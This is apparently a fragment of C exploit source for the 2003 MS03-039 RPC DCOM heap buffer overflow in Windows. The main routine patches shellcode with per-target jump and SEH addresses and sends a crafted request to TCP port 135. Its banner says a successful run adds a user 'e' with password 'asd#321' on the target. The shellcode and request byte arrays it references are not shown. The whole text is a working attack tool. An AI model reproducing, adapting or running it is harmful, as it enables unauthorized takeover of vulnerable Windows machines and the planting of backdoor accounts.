void main(int argc,char ** argv)
{
    WSADATA WSAData;
    SOCKET sock;
    int len,len1;
    SOCKADDR_IN addr_in;
    short port=135;
    unsigned char buf1[0x1000];
    unsigned char buf2[0x1000];
	int	i, iType;

	printf( "MS03-039 RPC DCOM long filename heap buffer overflow exp v1\n"
			"Base on flashsky's MS03-026 exp\n"
			"Code by ey4s<eyas#xfocus.org>\n"
			"2003-09-16\n"
			"Welcome to http://www.xfocus.net\n"
			"Thanks to flashsky & benjurry & Dave Aitel\n"
			"If success, target will add a user \"e\" and password is \"asd#321\"\n\n");

	if(argc!=3)
	{
		printf("Usage: %s <target> <type>\n", argv[0]);
		for(i = 0; i < sizeof(targets)/sizeof(v); i++)
			printf( "<%d>   %s\n"
					"      TopSeh=0x%.8x in %s\n"
					"      JmpAddr=0x%.8x in %s\n",
					i, targets[i].os,
					targets[i].dwTopSeh, targets[i].seh,
					targets[i].dwJmpAddr, targets[i].jmp);
		return;
	}

	iType = atoi(argv[2]);
	if((iType<0) || iType > sizeof(targets)/sizeof(v))
	{
		printf("[-] Wrong type.\n");
		return;
	}

	memcpy(&sc[sc_offset], sc_add_user, sizeof(sc_add_user));
	memcpy(&sc[jmp_addr_offset], &targets[iType].dwJmpAddr,4);
	memcpy(&sc[top_seh_offset], &targets[iType].dwTopSeh,4);
	printf("[+] Prepare shellcode completed.\n");

    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)
    {
        printf("WSAStartup error.Error:%d\n",WSAGetLastError());
        return;
    }

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(port);
    addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);
    
    if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        printf("Socket failed.Error:%d\n",WSAGetLastError());
        return;
    }
    if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
    {
        printf("Connect failed.Error:%d",WSAGetLastError());
        return;
    }
	printf("[+] Connect to %s:135 success.\n", argv[1]);

	if(sizeof(sc_add_user) > sc_max)
	{
		printf("[-] shellcode too long, exit.\n");
		return;
	}

 
    len=sizeof(sc);
    memcpy(buf2,request1,sizeof(request1));
    len1=sizeof(request1);
    *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sc)/2;  //计算文件名双字节长度
    *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sc)/2;//计算文件名双字节长度
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);
    memcpy(buf2+len1,sc,sizeof(sc));
    len1=len1+sizeof(sc);
    memcpy(buf2+len1,request3,sizeof(request3));
    len1=len1+sizeof(request3);
    memcpy(buf2+len1,request4,sizeof(request4));
    len1=len1+sizeof(request4);
    *(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+sizeof(sc)-0xc;
    //计算各种结构的长度
    *(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+sizeof(sc)-0xc;  
    *(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+sizeof(sc)-0xc;

    len = send(sock,bindstr,sizeof(bindstr),0);
	if(len<=0)
    {
            printf("[-] Send failed.Error:%d\n",WSAGetLastError());
            return;
    }
 	else
		printf("[+] send %d bytes.\n", len);
	
    len=recv(sock,buf1,1000,0);
	if(len<=0)
	{
		printf("[-] recv error:%d\n", GetLastError());
		return;
	}
	else
		printf("[+] recv %d bytes.\n", len);

    len = send(sock,buf2,len1,0);
	if(len<=0)
    {
            printf("[-] Send failed.Error:%d\n",WSAGetLastError());
            return;
    }
	else
		printf("[+] send %d bytes.\n", len);
    len=recv(sock,buf1,1024,0);
	if(len<=0)
	{
		printf("[+] Target crash or exploit success? :)\n");
	}
	else
		printf("[-] recv %d bytes. Bad luck!\n", len);
}